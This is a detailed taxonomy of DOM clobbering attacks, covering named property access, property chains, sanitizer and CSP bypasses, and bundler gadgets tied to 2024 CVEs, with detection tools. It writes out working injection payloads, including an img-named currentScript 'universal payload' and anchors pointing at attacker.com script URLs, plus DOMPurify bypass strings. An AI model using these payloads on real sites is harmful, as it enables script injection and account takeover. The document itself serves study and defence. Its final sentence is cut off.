# DOM Clobbering Mutation/Variation Taxonomy

---

## Classification Structure

DOM Clobbering is a class of **code-reuse, scriptless injection attacks** in which an attacker inserts non-script HTML markup into a web page to shadow or replace JavaScript variables, object properties, and browser APIs through the browser's legacy **Named Property Access** mechanism. Unlike conventional XSS, DOM Clobbering does not require injecting executable script tags — it leverages the HTML specification's guarantee that certain elements with `id` or `name` attributes are automatically exposed as properties on the `window` and `document` objects.

This taxonomy organizes the DOM Clobbering attack surface along three orthogonal axes:

- **Axis 1 — Clobbering Target (Primary)**: The structural component of the DOM/JavaScript runtime being overwritten. This is the main organizational axis of the document (§1–§8).
- **Axis 2 — Exploitation Mechanism (Cross-cutting)**: How the clobbered value is weaponized — the technique that transforms a DOM node reference into an attacker-controlled value (string coercion, property chain traversal, type confusion, etc.).
- **Axis 3 — Impact Scenario (Mapping)**: The downstream attack achieved through the clobber — XSS, CSP bypass, open redirect, sanitizer bypass, etc.

### Axis 2 Summary: Exploitation Mechanisms

| Mechanism | Description | Typical Output |
|-----------|-------------|----------------|
| **String Coercion** | `<a>` and `<base>` elements return `href` via `.toString()` | Attacker-controlled URL string |
| **Property Chain Traversal** | Multi-level property access via form hierarchy, HTMLCollection, or iframe nesting | Deep property value (`x.y.z`) |
| **Type Confusion** | Expected object/function replaced with DOM node | Filter bypass, logic subversion |
| **Collection Formation** | Duplicate `id` values create HTMLCollection with indexed + named access | Array-like iterable of clobbered nodes |
| **URL Protocol Abuse** | `cid:`, `ftp:`, `file:`, custom protocols bypass URL encoding | Unencoded special characters |
| **Cross-Frame Proxy** | Named iframe exposes `contentWindow` as global variable | Nested browsing context access |

### Foundation: The Named Property Access Algorithm

The root cause of all DOM Clobbering attacks is the **Named Property Access** mechanism defined in the WHATWG HTML Living Standard. This specification mandates:

1. **Window Named Access**: Elements with `id` attributes (all 141+ HTML element types) and elements with `name` attributes (`embed`, `form`, `iframe`, `img`, `image`, `object`) are accessible as properties of the `window` object.
2. **Document Named Access**: Elements with `id` or `name` attributes are accessible as properties of the `document` object, with named references taking **priority over built-in APIs**.
3. **Priority Rule**: On `document`, named HTML element references override built-in APIs (due to `[LegacyOverrideBuiltIns]`). On `window`, built-in properties take priority over named element references — named access on `window` only works for properties not already defined on the Window interface.

This means that `window.x` can be silently replaced by `<div id="x">` **only if `x` is not already defined** — i.e., the identifier has no binding from `var`/`let`/`const` declarations, built-in Window properties, or prior assignment to `window.x`. Top-level `let`/`const` declarations do not create `window` properties and thus cannot be clobbered via named access, though bare references to undeclared identifiers (`if (x)`) will resolve through the window and can be affected. On `document`, named access is more dangerous: `document.cookie` can be shadowed by `<img name="cookie">` because `document` has `[LegacyOverrideBuiltIns]`.

---

## §1. Window Global Variable Clobbering

The most fundamental form of DOM Clobbering: overwriting global JavaScript variables through `window` named property access. This targets the common JavaScript pattern of referencing variables via the global scope or through `window.*` lookups.

### §1-1. Direct Variable Replacement via ID Attribute

Any HTML element with an `id` attribute creates a corresponding property on the `window` object. If JavaScript code references an undefined or lazily-initialized global variable, the DOM node replaces the expected value.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Undefined variable clobber** | `<div id="config">` makes `window.config` resolve to the HTMLDivElement | Target variable is never explicitly declared with `var`/`let`/`const` |
| **Fallback pattern clobber** | `<a id="defaultURL" href="https://evil.com">` exploits `var url = window.defaultURL \|\| '/safe'` | Code uses logical OR with `window.*` lookup |
| **Re-resolution after DOM mutation** | Named access applies at lookup time, not declaration time. If code deletes or never assigns a window property (e.g., `delete window.config` or the assignment is conditional), a later-parsed element with that `id` can fill the gap. However, if the code has already created a real window property via `window.config = {...}` or `var config = ...`, the existing property takes priority over named access and the DOM element does **not** override it | Code conditionally assigns or later deletes the window property; OR code re-reads a global that was never firmly bound |

**Example — Fallback Pattern:**
```html
<!-- Attacker-injected HTML -->
<a id="configUrl" href="https://attacker.com/malicious.js"></a>

<!-- Victim code -->
<script>
  var scriptSrc = window.configUrl || '/default.js';
  // scriptSrc is now the HTMLAnchorElement,
  // but string coercion yields "https://attacker.com/malicious.js"
  var s = document.createElement('script');
  s.src = scriptSrc;
  document.head.appendChild(s);
</script>
```

### §1-2. Name-Based Variable Replacement

Only six element types support `name`-based access on the `window` object: `embed`, `form`, `iframe`, `img`, `image`, and `object`. The `name` attribute creates a property on `window` just like `id`, but with element-type restrictions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Form name clobber** | `<form name="settings">` creates `window.settings` | Target variable collides with form name |
| **Iframe name clobber** | `<iframe name="config">` exposes `contentWindow` as `window.config` | Iframe name matches target variable (special: returns WindowProxy, not element) |
| **Object/Embed name clobber** | `<object name="api">` or `<embed name="api">` creates global reference | Target variable collides with object/embed name |

**Critical distinction**: When an `iframe` has a `name` attribute, `window[name]` returns the iframe's **`contentWindow`** (a WindowProxy object), not the HTMLIFrameElement itself. This is the foundation for deep nested property chains (§3).

### §1-3. Duplicate ID HTMLCollection Formation

When two or more elements share the same `id` value, the browser creates an **HTMLCollection** (a live, array-like object) instead of returning a single element. This collection supports both indexed access (`collection[0]`, `collection[1]`) and named access via the `name` attribute (`collection.propertyName`).

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Indexed collection** | `<a id="x">`, `<a id="x">` → `window.x[0]`, `window.x[1]` | Two+ elements share same id |
| **Named collection property** | `<a id="x">`, `<a id="x" name="url" href="...">` → `window.x.url` | Second element has `name` attribute; creates two-level access |
| **Iterable collection** | HTMLCollection is iterable via `for...of` (has `Symbol.iterator`) but does **not** have a `.forEach()` method (unlike NodeList). Use `Array.from(collection).forEach()` or `for...of` for enumeration. | Gadget code iterates over the clobbered value |

**Example — Two-Level Property via HTMLCollection:**
```html
<a id="config"></a>
<a id="config" name="apiUrl" href="https://attacker.com/api"></a>

<script>
  // config is now an HTMLCollection
  // config.apiUrl returns the second anchor element
  // String(config.apiUrl) returns "https://attacker.com/api"
  fetch(config.apiUrl).then(/* ... */);
</script>
```

---

## §2. Document Property Shadowing

Named elements shadow properties on the `document` object, including **built-in APIs and native properties**. This is particularly dangerous because `document` properties are trusted implicitly by most JavaScript code.

### §2-1. Built-in API Shadowing

HTML elements with `id` or `name` attributes matching built-in `document` API names override those APIs entirely.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **API function replacement** | `<embed name="getElementById">` replaces `document.getElementById()` with an HTMLEmbedElement | Code calls `document.getElementById` which is now a DOM node, not a function |
| **Property override** | `<img name="cookie">` shadows `document.cookie` with an HTMLImageElement | Code reads `document.cookie` expecting a string |
| **Body/children override** | `<form id="body">` or `<img name="children">` replaces document structural properties | Code navigates DOM via `document.body` or `document.children` |
| **querySelector shadow** | `<img name="querySelector">` replaces `document.querySelector()` | Code uses `document.querySelector` for trusted DOM traversal |

**Critical**: Unlike `window`, where named access has lower priority than existing properties, on `document`, **named element references always overshadow built-in APIs and developer-assigned properties**, even immediately after assignment.

### §2-2. Custom Document Property Injection

Developers sometimes store configuration or state on the `document` object (e.g., `document.config = {...}`). Attackers can preemptively clobber these properties before the script assigns them, or shadow them if the script checks existence before assignment.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Pre-assignment clobber** | `<img name="config">` exists before script runs `document.config = {...}` | Script checks `if (!document.config)` before assigning |
| **Cross-script clobber** | Element placed between two `<script>` tags; first script sets property, second reads it | Property is re-resolved from DOM in the second script context |

### §2-3. document.currentScript Gadget

A high-impact subtype affecting bundlers and build tools. The `document.currentScript` property (which normally returns the `<script>` element currently being executed) can be clobbered by any element with `name="currentScript"`.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Script src hijack** | `<img name="currentScript" src="https://evil.com/">` → `document.currentScript.src` returns attacker URL | Bundler uses `document.currentScript.src` for path resolution |
| **baseURI fallback** | After clobbering `currentScript`, fallback `document.baseURI` may also be manipulated via `<base href="...">` | Code falls back to `document.baseURI` when `currentScript` fails |

This is the root cause of CVE-2024-43788 (Webpack), CVE-2024-47068 (Rollup), and CVE-2024-45812 (Vite). See §7 for detailed analysis.

---

## §3. Multi-Level Property Chain Clobbering

Simple clobbering overwrites a single global variable. More sophisticated attacks construct **deep property chains** (`x.y.z.w`) to match the nested object access patterns common in real-world JavaScript code.

### §3-1. Two-Level via HTMLCollection + Name Attribute

The most common multi-level technique. Two anchor elements with the same `id` form an HTMLCollection, and the `name` attribute of one creates a named property on the collection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Anchor pair** | `<a id="x"><a id="x" name="y" href="val">` → `x.y` returns href via toString | Target code accesses `x.y` as string |
| **Mixed element pair** | Different element types sharing same `id` → collection with named access | Less common; behavior varies by browser |

### §3-2. Two-Level via Form-Input Hierarchy

The parent-child relationship between `<form>` and its child elements (`<input>`, `<output>`, `<button>`, `<select>`, `<textarea>`) creates a natural two-level namespace: `form.childName`.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Form + input name** | `<form id="config"><input name="url" value="evil">` → `config.url.value` | Target code accesses `config.url` then reads `.value` |
| **Form + output** | `<form id="x"><output name="y">controlled</output>` → `x.y.value` | Output element allows textContent control |
| **Form + button** | `<form id="x"><button name="y">` → `x.y` is the button element | Target code checks `.type`, `.disabled`, etc. |

### §3-3. Three-Level via Form + HTMLCollection

Combining duplicate form IDs (to create HTMLCollection) with form-child hierarchies achieves three-level access.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Form collection + child** | `<form id="x" name="y"><input id="z">` → `x.y.z` | First form creates collection entry via `name`, child accessed via `id` |
| **Dual form + input** | `<form id="config"></form><form id="config" name="prod"><input name="apiUrl" value="evil">` → `config.prod.apiUrl.value` | Two forms same id, second has name and child input |

### §3-4. Deep Nesting via Iframe srcdoc

Named iframes expose their `contentWindow` as the global variable value. By nesting HTML within `srcdoc`, the attacker creates an isolated DOM tree whose elements are accessible through the iframe's window proxy.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **iframe + inner element** | `<iframe name="x" srcdoc="<a id='y' href='evil'>">` → `x.y` returns anchor in iframe | Cross-origin restrictions don't apply to srcdoc (same-origin) |
| **iframe + form + input** | `<iframe name="x" srcdoc="<form id='y'><input name='z' value='evil'>">` → `x.y.z.value` | Four-level access across frame boundary |
| **Nested iframes** | `<iframe name="a" srcdoc="<iframe name='b' srcdoc='...'>">` → `a.b.c...` | Arbitrary depth, but requires HTML entity encoding at each level |

**Limitation**: Iframe content loads asynchronously. If the victim code executes immediately (synchronously), the iframe's DOM may not yet be available. Stylesheets loaded within `srcdoc` can introduce load delays that work around some timing issues.

### §3-5. Nested Window Proxy Chains

A variation where multiple iframes create a chain of WindowProxy objects. Each named iframe's `contentWindow` serves as a namespace for the next level of named elements.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Proxy chain** | `a.b.c` where each level is an iframe contentWindow | All iframes are same-origin (srcdoc satisfies this) |
| **Hybrid proxy + collection** | Iframe contentWindow contains duplicate-id elements forming HTMLCollection | Combines cross-frame and collection techniques |

---

## §4. String Coercion and Value Extraction

A clobbered value is initially a **DOM node reference**, not a primitive value. To be weaponized, the attacker must ensure the code path converts it to a usable string, URL, or other primitive. This section catalogs the conversion mechanisms.

### §4-1. Anchor/Base Element toString()

The `<a>` and `<base>` elements are the only HTML elements whose `.toString()` method returns a meaningful attacker-controlled value: the **href attribute**. All other elements return `"[object HTMLDivElement]"` or similar.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Implicit string coercion** | Template literals, string concatenation, or `+` operator trigger `.toString()` → returns `href` | Code uses `` `${x}` `` or `x + ''` or `String(x)` |
| **URL assignment** | `script.src = x` or `location = x` triggers internal URL resolution which calls `.toString()` | Sink expects a URL-like value |
| **Fetch/XHR argument** | `fetch(x)` or `xhr.open('GET', x)` triggers string conversion | Network API consumes clobbered anchor element |
| **Comparison coercion** | `if (x == 'expected')` triggers `.toString()` for loose equality | Non-strict equality comparison |

### §4-2. URL Property Extraction

Anchor elements expose URL-parsed properties beyond `href` that provide fine-grained control over extracted values.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Protocol extraction** | `<a id="x" href="javascript:alert(1)">` → `x.protocol` returns `"javascript:"` | Code reads `.protocol` from clobbered element |
| **Hostname extraction** | `<a id="x" href="https://evil.com">` → `x.hostname` returns `"evil.com"` | Code reads `.hostname` for domain validation |
| **Pathname extraction** | `<a id="x" href="https://evil.com/path">` → `x.pathname` returns `"/path"` | Code reads `.pathname` for routing |
| **Username/Password** | `<a id="x" href="ftp:user:pass@host">` → `x.username` = `"user"`, `x.password` = `"pass"` | Code reads credential-like properties from URL object |
| **Hash extraction** | `<a id="x" href="https://evil.com#payload">` → `x.hash` returns `"#payload"` | Code extracts fragment for configuration |

### §4-3. Protocol-Based Encoding Bypass

Different URL protocols have different encoding rules, allowing special characters to survive URL normalization.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **cid: protocol** | `href="cid:payload"` — DOMPurify allows `cid:` which does not URL-encode double quotes | Sanitizer permits `cid:` protocol; runtime decodes entities |
| **data: URL** | `href="data:,alert(1)//"` — data URLs carry inline content | Target sink accepts data URLs (e.g., script src with `strict-dynamic`) |
| **javascript: URL** | `href="javascript:alert(1)"` — direct code execution if used in navigation sink | Sanitizer fails to strip `javascript:` or code processes href directly |
| **Custom protocol** | `href="abc:<>"` — unknown protocols preserve special characters unencoded | Target code extracts characters that would normally be encoded |

### §4-4. Element Property Value Extraction

Beyond string coercion, specific element properties carry attacker-controlled values.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **input.value** | `<input id="x" value="controlled">` → `x.value` returns string | Code reads `.value` from clobbered reference |
| **textarea.value** | `<textarea id="x">controlled</textarea>` → `x.value` returns content | Code reads `.value` from form element |
| **output.value** | `<output id="x">controlled</output>` → `x.value` returns content | Less commonly filtered than input/textarea |
| **element.textContent** | `<div id="x">controlled</div>` → `x.textContent` returns inner text | Code reads `.textContent` (though `.innerHTML` is not settable via clobbering) |
| **element.dataset** | `<div id="x" data-url="evil">` → `x.dataset.url` returns `"evil"` | Code reads `data-*` attributes via `.dataset` |

---

## §5. Filter and Sanitizer Bypass via Clobbering

DOM Clobbering can be directed inward — targeting the security controls themselves rather than application logic. By clobbering properties that sanitizers rely on for DOM traversal, the sanitizer's logic is subverted.

### §5-1. Attributes Property Clobbering

HTML sanitizers typically enumerate element attributes via the `.attributes` property (a `NamedNodeMap`). Clobbering this property replaces the `NamedNodeMap` with a DOM node, causing the sanitizer to skip attribute inspection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Form + input[id=attributes]** | `<form onclick=alert(1)><input id=attributes>` → `form.attributes` returns the input element, not NamedNodeMap | Sanitizer iterates `.attributes` without type-checking |
| **Direct id clobber** | `<div id="attributes">` within form context | Sanitizer accesses `.attributes` on the parent form |

**Result**: The sanitizer believes the element has no (or different) attributes, allowing `onclick` handlers and other dangerous attributes to pass through.

### §5-2. NodeName / TagName Clobbering

Sanitizers often check `element.nodeName` or `element.tagName` to determine element type for allowlist/blocklist filtering.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Form + input[id=nodeName]** | `<form><input id=nodeName value="DIV">` → `form.nodeName` returns the input element | Sanitizer uses `.nodeName` for allowlist check |
| **TagName override** | `<form><input id=tagName>` → `form.tagName` is clobbered | Sanitizer's tag-based filtering is bypassed |

### §5-3. Children / ChildNodes Clobbering

Clobbering `.children` or `.childNodes` disrupts sanitizer DOM traversal, causing child elements to be skipped during sanitization.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Children property override** | `<form><input id=children>` → `form.children` is the input element, not an HTMLCollection of child elements | Sanitizer recursively processes `.children` |
| **Length clobber** | Clobbering `.length` on a collection disrupts iteration loops | Sanitizer uses `for (i=0; i<el.children.length; ...)` |

### §5-4. ParentNode / OwnerDocument Clobbering

Clobbering tree-navigation properties causes sanitizers to lose context about where an element exists in the DOM tree.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **parentNode override** | `<form><input id=parentNode>` → `form.parentNode` returns input, not actual parent | Sanitizer checks parentage for context-sensitive filtering |
| **ownerDocument override** | Clobbering `ownerDocument` disrupts document context lookups | Sanitizer delegates to document-level APIs |

### §5-5. DOMPurify-Specific Bypass Techniques

DOMPurify includes DOM Clobbering protection by default, but specific bypass techniques have been discovered.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **cid: protocol decode bypass** | `<a id=x href="cid:&quot;onerror=alert(1)//">` — DOMPurify permits `cid:` which doesn't URL-encode quotes; decoded at runtime | DOMPurify default config; value used in attribute injection context |
| **Nested node limit bypass** | In DOMPurify ≤3.1.4, bypassing nested node limits re-enables clobbering payloads that circumvent mXSS regex protection | Specific DOMPurify version with nested node protection |
| **SANITIZE_NAMED_PROPS off** | When `SANITIZE_NAMED_PROPS` is not set to `true`, id/name attributes pass through without prefixing | Default DOMPurify config (prefix isolation disabled by default) |
| **Hook-based bypass** | Custom DOMPurify hooks that reference clobberable properties in their logic | Developer-defined hooks with unsafe DOM access patterns |

---

## §6. Content Security Policy (CSP) Bypass via Clobbering

DOM Clobbering provides a unique pathway to CSP bypass because it operates entirely within the HTML layer — no inline scripts are injected. Instead, existing trusted scripts are manipulated to load attacker-controlled resources.

### §6-1. Gadget-Based Script Source Manipulation

When a CSP-protected page contains a nonce-protected script that dynamically resolves its own path, clobbering the path resolution variable causes the script to load from an attacker-controlled origin.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **currentScript.src hijack** | Clobber `document.currentScript` → trusted script reads attacker-controlled `src` for relative path resolution | Script uses `document.currentScript.src` to find its own directory |
| **baseURI manipulation** | `<base href="https://evil.com/">` combined with relative script paths | Script falls back to `document.baseURI` for path resolution |
| **Nonce-protected gadget** | Clobbered variable consumed by a script that has a valid CSP nonce | CSP uses `nonce-*` or `strict-dynamic`; gadget is in nonce-protected code |

### §6-2. strict-dynamic Exploitation

Under `strict-dynamic`, scripts loaded by a nonce-protected script are themselves trusted. If the nonce-protected script contains a DOM Clobbering gadget, the attacker can chain through it to load arbitrary scripts.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Clobber + createElement('script')** | Nonce-protected script reads clobbered variable as script source, creates new script element | `strict-dynamic` in CSP; script dynamically creates child scripts |
| **Clobber + data: URL** | `<a id="x" name="src" href="data:,alert(1)//">` used as script source under strict-dynamic | CSP allows propagation; data: URL accepted |

### §6-3. Trusted Types Interaction

Trusted Types can theoretically prevent DOM Clobbering exploitation at the sink level by requiring typed objects for dangerous assignments (e.g., `script.src`). However, coverage gaps exist.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Non-typed sink exploitation** | Clobbered value used in sinks not covered by Trusted Types (e.g., `location.href`, `window.open()`) | Trusted Types only covers specific DOM sinks |
| **Policy bypass** | Clobbered value passes through a Trusted Types policy that doesn't validate string content | Overly permissive Trusted Types policy (`TrustedScriptURL` accepts any string) |

---

## §7. Build Tool and Library Gadgets

Modern JavaScript ecosystems contain DOM Clobbering **gadgets** — code patterns in bundlers, libraries, and frameworks that, when combined with scriptless HTML injection, produce exploitable vulnerabilities. This section catalogs known gadget families.

**Combined Chain: Library Gadgets as DOMPurify Bypass Vectors.** When DOMPurify is deployed as the sanitizer, the gadgets cataloged below become the critical escalation path. DOMPurify (§5-5) sanitizes script-bearing elements but permits benign-looking attributes like `id`, `name`, and `href` with `cid:` protocol. An attacker injects clobbering elements that survive sanitization (e.g., `<a id=x>` or `<img name=currentScript>`), and these elements then activate a downstream library gadget — the bundler runtime reads the clobbered `document.currentScript.src` and loads attacker-controlled scripts, or a client-side router processes the clobbered navigation state. The result is XSS despite DOMPurify being correctly configured and up-to-date: the sanitizer cannot block the clobbering elements because they contain no executable content, while the library gadget converts the clobbered DOM property into script execution. This §5-5 → §7 chain was systematically demonstrated in the "Under the Beamer" research (mizu.re, 2025), showing that DOMPurify bypass is achievable through the library gadget layer without requiring any DOMPurify-specific vulnerability.

### §7-1. Bundler Runtime Path Resolution Gadgets

Bundlers that convert ES modules to browser-compatible formats (CJS/UMD/IIFE) often generate runtime code that resolves file paths using `document.currentScript`. This pattern is a universal DOM Clobbering gadget.

| Gadget Target | Vulnerable Pattern | CVE | Patched Version |
|---------------|-------------------|-----|----------------|
| **Webpack** | `AutoPublicPathRuntimeModule`: `document.currentScript.src` used when `publicPath` is `'auto'` or unset | CVE-2024-43788 | ≥5.94.0 |
| **Rollup** | `import.meta.url` transpiled to `document.currentScript.src \|\| document.baseURI` in CJS/UMD/IIFE output | CVE-2024-47068 | ≥2.79.2 / ≥3.29.5 / ≥4.22.4 |
| **Vite** | Dynamic imports from assets folder use `document.currentScript` for URL resolution | CVE-2024-45812 | ≥5.4.6 / ≥4.5.4 |

**Universal payload**: `<img name="currentScript" src="https://attacker.com/">` clobbers `document.currentScript` and redirects script loading.

**Fix pattern**: All three bundlers patched by adding type validation:
```javascript
document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src
```

### §7-2. Syntax Highlighting Library Gadgets

Libraries that process code blocks in user-generated content often reference `document.currentScript` for configuration resolution.

| Gadget Target | Vulnerable Pattern | CVE | Patched Version |
|---------------|-------------------|-----|----------------|
| **PrismJS** | `document.currentScript` lookup for autoloader configuration can be shadowed | CVE-2024-53382 | ≥1.30.0 |

### §7-3. Client-Side Router Gadgets

Single-Page Application (SPA) routers that use named elements for navigation state are vulnerable to clobbering.

| Gadget Target | Vulnerable Pattern | CVE | Patched Version |
|---------------|-------------------|-----|----------------|
| **Astro** | Client-side router uses iframe `name` attributes for navigation state; stored HTML with unsanitized `name` attributes enables XSS | CVE-2024-47885 | ≥4.15.5 |

### §7-4. AMP / Dynamic Script Loading Gadgets

Google's AMP framework and similar dynamic script loaders construct script URLs from DOM-accessible configuration variables.

| Gadget Target | Vulnerable Pattern | Impact |
|---------------|-------------------|--------|
| **AMP4Email (Gmail)** | `AMP_MODE.localDev`, `AMP_MODE.test`, `testLocation.protocol` used to construct CDN URLs | XSS in Gmail via clobbered AMP configuration variables |
| **Google Client API** | Configuration properties resolved from global variables susceptible to clobbering | Script source manipulation |
| **Google Closure** | Module loading patterns reference clobberable globals | Script source manipulation |
| **MathJax** | Configuration resolution via global variable patterns | Script/resource source hijacking |

### §7-5. Collaboration Tool Gadgets

Web-based notebooks and collaboration platforms that render user-supplied HTML are especially vulnerable because they provide the HTML injection vector natively.

| Gadget Target | Vulnerable Pattern | CVE |
|---------------|-------------------|-----|
| **Jupyter Notebook/Lab** | HTML injection in notebook cells → DOM Clobbering → XSS | CVE-2024-43805 |
| **HackMD** | Markdown rendering with insufficient name/id sanitization | Documented in research |
| **Canvas LMS** | User-generated content with HTML injection leading to DOM clobbering gadgets | Documented in research |

---

## §8. Browser and Specification-Level Clobbering Surfaces

Beyond application-level gadgets, the browser itself exposes clobberable APIs at the specification level.

### §8-1. Native Browser API Clobbering

Research has identified **114+ native browser APIs** that DOM Clobbering markups can potentially interact with. However, an important distinction applies: on `window`, built-in properties (including `caches`, `trustedTypes`, `navigation`, `location`) take **priority** over named element access per the spec's Priority Rule (§Foundation). These APIs cannot be directly clobbered by `<div id="caches">` on the `window` object. The real risk arises in two scenarios: (1) on `document`, where `[LegacyOverrideBuiltIns]` allows named access to override built-in APIs, and (2) when application code copies a window API reference into a local variable or accesses it through an intermediate object that is itself clobberable.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Document-level API shadow** | Named elements shadow `document.*` API references (e.g., `document.forms`, `document.images`) because `document` has `[LegacyOverrideBuiltIns]` | Element `name`/`id` matches a `document` built-in property |
| **Indirect API reference clobber** | Application code assigns a window API to a clobberable intermediate (e.g., `var cache = window.caches` where `cache` is later re-resolved via a global lookup in a different scope) | Code accesses the API through an undeclared or re-resolvable global variable, not directly via `window.caches` |
| **Custom wrapper clobber** | Framework or library wraps a native API in a global variable (e.g., `window.navigation = customRouter`) that is itself clobberable if the assignment is conditional | Wrapper assignment uses `window.x = window.x || ...` pattern |

### §8-2. SVG/MathML Namespace Clobbering

Elements within SVG or MathML namespaces can interact with the clobbering mechanism through `<foreignObject>` bridges.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **SVG foreignObject bridge** | `<svg><foreignObject><html id="target">clobbered</html></foreignObject></svg>` | SVG context with foreignObject allows HTML elements that participate in named access |
| **MathML element clobbering** | MathML elements with id attributes participate in window named access | Browser supports MathML rendering |

### §8-3. Duplicate Document Element Clobbering

A quirk of HTML parsing: `<html>`, `<body>`, and `<head>` tags appearing later in the document can sometimes override or supplement earlier instances. Combined with `id` attributes, this enables overriding early-loaded configuration elements.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Late HTML/BODY injection** | `<html id="cdnDomain">clobbered</html>` after a `<div id="cdnDomain">original</div>` — `getElementById()` may return the later element | Browser-specific parsing quirks; not standardized |
| **Display:none override** | Hidden element with `id` exists; visible later element with same `id` clobbers it in `getElementById` | Multiple elements sharing id; querySelector returns first, named access may return collection |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Impact |
|----------|-------------|---------------------------|--------|
| **XSS via script source hijack** | Bundled JS app with HTML injection sink | §2-3 + §7-1 + §4-1 | Arbitrary JavaScript execution |
| **CSP bypass** | Strict CSP with nonce/strict-dynamic, nonce-protected gadget | §6-1 + §6-2 + §1-1 | CSP policy circumvented |
| **Sanitizer bypass** | DOMPurify/custom sanitizer with clobberable traversal logic | §5-1 through §5-5 | Malicious attributes pass filter |
| **Open redirect** | Application reads redirect URL from clobberable variable | §1-1 + §4-1 | User redirected to phishing page |
| **CSRF** | Application reads endpoint URL from clobberable config | §3-1 + §4-1 | Requests sent to attacker-controlled endpoint |
| **Script gadget chain** | Multi-step: HTML injection → clobber config → load external script | §1-1 + §3-4 + §6-1 + §7-4 | Full account takeover (e.g., Gmail AMP case) |
| **Post-message chain** | Subdomain XSS → postMessage → innerHTML → DOM clobber → CSP bypass | §1-1 + §6-1 + §7 | Cross-origin impact escalation |

---

## CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §2-3 + §7-1 | CVE-2024-43788 (Webpack ≤5.93.0) | CVSS 6.4. AutoPublicPathRuntimeModule XSS via `document.currentScript` clobber |
| §2-3 + §7-1 | CVE-2024-47068 (Rollup ≤4.22.3) | CVSS 6.4. `import.meta.url` transpilation gadget → XSS |
| §2-3 + §7-1 | CVE-2024-45812 (Vite ≤5.4.5) | CVSS 6.4. Dynamic import path resolution gadget → XSS |
| §2-3 + §7-2 | CVE-2024-53382 (PrismJS ≤1.29.0) | DOM Clobbering → XSS via `document.currentScript` shadow |
| §1-2 + §7-3 | CVE-2024-47885 (Astro) | Client-side router iframe name clobber → XSS |
| §2-2 + §7-5 | CVE-2024-43805 (Jupyter Notebook/Lab) | HTML injection → DOM Clobbering → XSS in notebook context |
| §1-1 + §4-1 | CVE-2024-53386 (stage.js) | DOM Clobbering → XSS |
| §1-1 + §3-1 + §7-4 | Gmail AMP4Email (2019, landmark) | `AMP_MODE` variable clobber → XSS in Gmail. Bypassed CSP + sanitizer |
| §7-4 | Google Closure, Google Client API, MathJax | Zero-day gadgets detected by Hulk (2025). 497 total gadgets across libraries |
| §1–§5 | Tranco Top 5K scan | DOM clobbering vulnerabilities found across a measurable share of popular sites, with manually confirmed exploitability |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **TheThing** (Static + Dynamic) | Detect DOM Clobbering sources and sinks in web applications | Static taint analysis of variable flows from window/document named access to sensitive sinks; dynamic validation of clobberability |
| **Hulk** (Dynamic, USENIX Security '25) | Detect and exploit DOM Clobbering gadgets via Symbolic DOM | Concolic execution with symbolic DOM modeling; generates 1.7M+ HTML markups as exploits; detected 497 exploitable gadgets |
| **DOM Invader** (Burp Suite) | Automated DOM Clobbering testing in browser | Instruments JavaScript sources/sinks in Chromium; reports clobbered property paths and sink values |
| **dom-clob-check** (CLI) | Simple vulnerability scanning for DOM Clobbering patterns | CLI tool for quick pattern detection in web page source |
| **Snyk Code** (SAST) | Static detection of DOM Clobbering in JavaScript codebases | AST-based pattern matching for clobberable variable access patterns |
| **Dom-Explorer** (YesWeHack) | Browser HTML parsing behavior analysis | Reveals how browsers parse and mutate HTML; identifies mutation XSS and DOM Clobbering vectors |
| **DOMPurify** (Defense) | HTML sanitization with DOM Clobbering protection | Prefix-based namespace isolation (`SANITIZE_NAMED_PROPS: true`); strips or prefixes `id`/`name` attributes matching document/window properties |
| **Sanitizer API** (Defense, Browser-native) | Browser-built-in HTML sanitization | Can be configured to remove `id` and `name` attributes; **no default DOM Clobbering protection** per specification |

---

## Summary: Core Principles

### The Root Cause: Legacy Named Access as a Feature

The entire DOM Clobbering attack surface exists because of a **20+ year-old browser specification feature**: the Named Property Access algorithm. This algorithm was designed in the early days of HTML to provide convenient access to form elements and page anchors, long before JavaScript security was a concern. The WHATWG HTML Living Standard continues to mandate this behavior for backward compatibility, making it a permanent part of the web platform.

The fundamental property that makes DOM Clobbering possible is the **bidirectional coupling between the HTML layer and the JavaScript runtime**. In every other programming environment, injecting passive data (HTML markup) cannot affect the behavior of executable code (JavaScript). On the web, injecting a `<div id="config">` silently overwrites `window.config`, violating the assumption that HTML and JavaScript are separate layers.

### Why Incremental Fixes Fail

Each CVE patch follows the same pattern: add a type check (`tagName === 'SCRIPT'`), validate the property type (`instanceof NamedNodeMap`), or prefix user-controlled attributes. These fixes address individual gadgets but do not eliminate the underlying mechanism. New gadgets are continuously discovered — 497 unique gadgets were found in a single 2025 study — because:

